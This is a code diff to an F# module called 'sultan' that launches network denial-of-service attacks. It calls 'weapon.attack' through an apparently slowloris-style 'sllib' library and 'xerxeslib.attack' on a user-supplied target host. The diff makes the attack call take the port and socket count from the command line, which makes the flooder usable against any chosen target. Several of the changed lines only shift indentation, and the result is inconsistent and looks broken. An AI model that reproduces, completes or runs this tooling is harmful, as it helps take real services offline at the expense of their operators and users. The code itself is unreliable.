@@ -15,9 +15,9 @@ module sultan =
         let sockets = 0
         let port = 0
         if args.Length < 2 then
-            error "100 Target host not provided. Aborting."
-            exit 1
-            else verbose "starting...\n"
+                error "100 Target host not provided. Aborting."
+                exit 1
+                else verbose "starting...\n"
 
         if args.Length < 3 then
             printfn "[sultan] No port provided, defaulting to port 80"
@@ -36,16 +36,16 @@ module sultan =
                 ""
 
         let weapon = new sllib()
-        weapon.attack(args.[1], port, false, sockets);
+        weapon.attack(args.[1], System.Int32.Parse(args.[2]), false, System.Int32.Parse(args.[3]));
         Thread.Sleep(Timeout.Infinite);
         0
 
     let invoke_xerxes (args : string[]) =
             let connections = 0
             let port = 0
-            if args.Length < 2 then
-                error "200 Target host not provided. Aborting."
-                exit 1
+         if args.Length < 2 then
+             error "200 Target host not provided. Aborting."
+             exit 1
                 else verbose "starting...\n"
 
             xerxeslib.attack args.[1] port 0 connections
